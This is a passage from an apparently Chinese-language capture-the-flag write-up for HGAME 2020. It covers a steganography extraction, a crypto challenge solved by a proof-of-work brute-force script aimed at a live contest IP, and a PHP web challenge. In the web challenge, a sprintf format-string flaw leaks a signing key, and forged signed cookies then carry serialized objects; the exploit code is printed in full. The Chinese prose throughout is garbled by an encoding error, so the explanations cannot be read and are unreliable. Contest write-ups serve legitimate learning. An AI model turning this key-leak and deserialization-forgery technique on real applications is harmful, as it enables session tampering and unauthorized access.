href="http://virtualdub2.com/">http://virtualdub2.com/</a><br>ã€å‚è€ƒèµ„æ–™2ã€‘ï¼š<a href="https://sourceforge.net/projects/virtualdubffmpeginputplugin/">https://sourceforge.net/projects/virtualdubffmpeginputplugin/</a></p><p>ç»“åˆé¢˜â½¬ç»™å‡ºçš„å‚è€ƒèµ„æ–™ï¼Œå¯ä»¥å‘ç°å¯¹è§†é¢‘è¿›â¾å¤„ç†éœ€è¦â½¤åˆ°VirtualDub2ã€‚ç»“åˆç™¾åº¦æœç´¢ï¼ŒçŒœæƒ³è§†é¢‘ç»è¿‡MSU StegoVideoéšå†™ï¼ŒMSU StegoVideoé“¾æ¥ï¼š<a href="http://www.compression.ru/video/stego_video/index_en.html">http://www.compression.ru/video/stego_video/index_en.html</a></p><p>å®‰è£…è½¯ä»¶ï¼Œå¹¶å°†æ’ä»¶å…¨éƒ¨è§£å‹â¾„plugin32â½‚ä»¶å¤¹ã€‚éšåè¿â¾32ä½ç‰ˆæœ¬VirtualDub2ï¼Œè½½â¼Šæ’ä»¶ã€‚Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0 -&gt; OKï¼š</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200203164547.png" style="zoom:80%;"><p>å¼¹å‡ºMSU StegoVideoæ’ä»¶ç•Œâ¾¯ã€‚é€‰æ‹© Extract fifile from videoï¼Œå¹¶å¡«å¥½å¯†ç å’Œåˆ†ç¦»å‡ºçš„â½‚ä»¶çš„è·¯å¾„</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200203165755.png" style="zoom:80%;"><p>ç„¶åæ‰“å¼€è§†é¢‘æ–‡ä»¶ï¼Œæ¥ç€Go-&gt; Preview fifiltered</p><p>æ’­æ”¾ä¸€ä¼šå‘ç°ï¼Œæ–‡ä»¶é‡Œå†™å…¥äº†</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200203170116.png" style="zoom:80%;"><p>è§£å‹å¾—åˆ°<code>Code128.png</code>ï¼Œåœ¨çº¿è§£å¯†åœ°å€ï¼š<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200203171150.png" style="zoom: 80%;"><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="Verification-code"><a href="#Verification-code" class="headerlink" title="Verification_code"></a>Verification_code</h4><p>æœ‰æºç ï¼Œå°±æ˜¯ä¸€ä¸ªæš´åŠ›ç ´è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os, sys, signal</span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=True</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline: msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed( os.urandom(<span class="number">8</span>) )</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([ random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>) ])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(str.encode( <span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:],_hexdigest) ))</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.send(<span class="string">b&#x27;The secret code?&#x27;</span>)</span><br><span class="line">        _code = self.recv()</span><br><span class="line">        <span class="keyword">if</span> _code == <span class="string">b&#x27;I like playing Hgame&#x27;</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Ok, you find me.&#x27;</span>)</span><br><span class="line">            self.send(<span class="string">b&#x27;Here is the flag: &#x27;</span> + FLAG)</span><br><span class="line">            self.send(<span class="string">b&#x27;Bye~&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Rua!!!&#x27;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>å†™äº†ä¸ªexpï¼Œå¾ˆçƒ‚2333â€¦..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket,re</span><br><span class="line"></span><br><span class="line">s=string.ascii_letters+string.digits</span><br><span class="line">sk=socket.socket()</span><br><span class="line">sk.connect((<span class="string">&quot;47.98.192.231&quot;</span>,<span class="number">25678</span>))</span><br><span class="line">secret=sk.recv(<span class="number">1024</span>).decode()</span><br><span class="line">print(secret)</span><br><span class="line">ant=re.match(<span class="string">r&quot;sha256\(XXXX\+(\w&#123;16&#125;)\) == (\w&#123;64&#125;)&quot;</span>,secret).group(<span class="number">1</span>)</span><br><span class="line">txt=re.match(<span class="string">r&quot;sha256\(XXXX\+(\w&#123;16&#125;)\) == (\w&#123;64&#125;)&quot;</span>,secret).group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">flag=i+j+k+l</span><br><span class="line"><span class="keyword">if</span> txt==sha256((flag+ant).encode()).hexdigest():</span><br><span class="line">print(flag)</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">sk.send(flag.encode())</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">sk.send(<span class="string">b&quot;I like playing Hgame&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> sk.recv(<span class="number">1024</span>):</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="åºåˆ—ä¹‹äº‰-Ordinal-Scale"><a href="#åºåˆ—ä¹‹äº‰-Ordinal-Scale" class="headerlink" title="åºåˆ—ä¹‹äº‰ - Ordinal Scale"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h4><p><code>source.zip</code>æœ‰æºç ï¼Œåœ¨<code>game.php</code>ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line"> &lt;h2&gt;hgame&#123;flag_is_here&#125;&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å³å½“æˆ‘ä»¬æˆä¸ºç¬¬â¼€åæ—¶ï¼Œå³å¯è·å¾— flagã€‚è·Ÿè¿›å»çœ‹â¼€ä¸‹<code>Get()</code>â½…æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;rank&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">&#x27;rank&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params">$no</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;rank = $no; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>$rank</code>æ˜¯ä»Sessionâ¾¥â¾¯å–å¾—çš„ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è®¾ç½® Session çš„åŠæ³•ã€‚</p><p>åœ¨<code>Rank</code>ç±»çš„ææ„å‡½æ•°ä¸­å­˜åœ¨è®¾ç½® Sessionã€‚åŒæ—¶åœ¨ 108 â¾å­˜åœ¨<code>unserialize</code>ååºåˆ—åŒ–å‡½æ•°ï¼ŒåŒæ—¶ç»“åˆ</p><p>è¯¥é¢˜åå­—ä¸º åºåˆ—ä¹‹äº‰ å› æ­¤å°è¯•ä½¿â½¤ååºåˆ—åŒ–æ¥ä¿®æ”¹ Sessionã€‚</p><p>ç„¶â½½åœ¨ <code>unserialize</code> å‡½æ•°å‰æœ‰â¼€æ­¥æ£€æŸ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$monsterData = base64_decode($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">$sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">$monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br></pre></td></tr></table></figure><p><code>$monsterData</code> æ˜¯é€šè¿‡å¯¹ <code>Cookie monster</code> è¿›â¾å­—ç¬¦ä¸²æˆªå–å¾—åˆ°çš„ï¼Œ <code>monster</code> åæœ‰â¼€ä¸ª 32 ä½çš„ md5</p><p><code>$sign</code> è¿›â¾ç­¾åæ£€æŸ¥ã€‚è¿™â¾¥æˆ‘ä»¬å°±éœ€è¦çŸ¥é“ <code>encryptKey</code> çš„å€¼æ‰èƒ½ä¼ªé€ è¿™ä¸ªç­¾åã€‚</p><p>â½½ <code>encryptKey</code> æ˜¯æ¥â¾ƒäº <code>Game</code> ç±»çš„ <code>sign</code> å±æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line"><span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â¼Šå‚ <code>$data</code> çš„å€¼ä¸ºæ•°ç»„ <code>[$playerName, $this-&gt;encryptKey]</code> ï¼Œå…ƒç´ ä¸­å«æœ‰ <code>encryptKey</code> ã€‚</p><p>åˆ†æâ¼€ä¸‹è¿™ä¸ªâ½…æ³•çš„åŠŸèƒ½ï¼Œè¿™ä¸ª <code>init()</code> â½…æ³•æ˜¯â½¤æ¥åˆå§‹åŒ–æ¬¢è¿è¯­ <code>welcomeMsg</code> ä»¥åŠ <code>sign</code> ã€‚</p><p>å…¶ä¸­æ¬¢è¿è¯­ <code>welcomeMsg</code> çš„â½£æˆä¸­ä½¿â½¤äº† <code>sprintf</code> å‡½æ•°ï¼Œä¸”æ”¾åœ¨â¼€ä¸ªå¾ªç¯å†…ï¼Œç¬¬â¼†è½®å¾ªç¯çš„ <code>$value</code> å€¼</p><p>å³ä¸º <code>encryptKey</code> ã€‚å› æ­¤å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>è¿›â¼Šæ¸¸æˆï¼Œè¾“â¼Šåå­—ï¼š <code>%s</code> ï¼Œå³å¯ä½¿å¾—åœ¨ç¬¬â¼†è½®å¾ªç¯ä¸­ <code>%s</code> çš„å€¼è¢« <code>sprintf</code> å‡½æ•°æ¢æˆ <code>encryptKey</code> ã€‚ç‚¹</p><p>å‡» <code>Link Start</code>ï¼Œæ‹¿åˆ° <code>encryptKey</code> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ä¼ªé€  <code>$sign</code> äº†ã€‚</p><p>ä½† <code>Rank</code> ç±»çš„ææ„å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;rank&#x27;</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// â¾®æ­£å¸¸è®¿é—®</span></span><br><span class="line">session_start();</span><br><span class="line">session_destroy();</span><br><span class="line"> setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è®¾ç½® Session å‰ä¼šâ½å¯¹ <code>key</code> ä»¥åŠ <code>serverKey</code> çš„å€¼ï¼Œå…¶ä¸­ <code>serverKey</code> æ˜¯æ¥â¾ƒäºæœåŠ¡å™¨çš„ç¯å¢ƒå˜é‡ï¼Œè¿™</p><p>ä¸ªå€¼æˆ‘ä»¬â½†æ³•è·å¾—ã€‚</p><p>è¿™â¾¥æœ‰ä¸¤ç§â½…æ³•ï¼šâ¼€ç§æ˜¯å¼•â½¤èµ‹å€¼ï¼Œå¯ä»¥å°† <code>$this-&gt;serverKey</code> çš„å¼•â½¤èµ‹å€¼ç»™ç»™ <code>$this-&gt;key</code> ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey</span><br></pre></td></tr></table></figure><p>å¦â¼€ç§â½…æ³•æ˜¯ç›´æ¥ä¸è®¾ç½® <code>$key</code> å±æ€§ã€‚ååºåˆ—åŒ–æ—¶ä¼šå– <code>Rank</code> ç±»ä¸­çš„é»˜è®¤å€¼ã€‚</p><p>æ‹ä¸‹æ€è·¯ï¼š</p><ul><li>è¾“å…¥<code>%s</code>è·å¾—<code>encryptKey</code></li><li>æ„é€ æ‰§è¡Œååºåˆ—åŒ–å‡½æ•°ï¼Œååºåˆ—åŒ–<code>Rank</code>ç±»ï¼Œå°†<code>$rank</code>è®¾ç½®æˆ1</li><li>ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•å¯ä»¥å¼•â½¤èµ‹å€¼æˆ–è€…ä¸èµ‹å€¼ä¸¤ç§æ–¹å¼</li></ul><p>æœ€ç»ˆ exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $rank = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> $serverKey;</span><br><span class="line"> <span class="keyword">private</span> $key;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data = [<span class="string">&#x27;moonback&#x27;</span>, <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>];</span><br><span class="line">$sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line">$sign .= md5($sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">$rank = serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $rank = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line">$data = [<span class="string">&#x27;moonback&#x27;</span>, <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>];</span><br><span class="line">$sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line">$sign .= md5($sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">$rank = serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span><br></pre></td></tr></table></figure><p>è¾“â¼Šåå­— <code>moonback</code> è¿›â¼Šæ¸¸æˆï¼Œæ›¿æ¢ <code>monster Cookie</code>ï¼Œåˆ·æ–°â»šâ¾¯ï¼Œæˆä¸ºç¬¬â¼€åæ‹¿åˆ° flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200210114759.png" style="zoom: 67%;"><p>è´´ä¸€ä¸‹ä»£ç ï¼š</p><p><strong>cardinal.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span 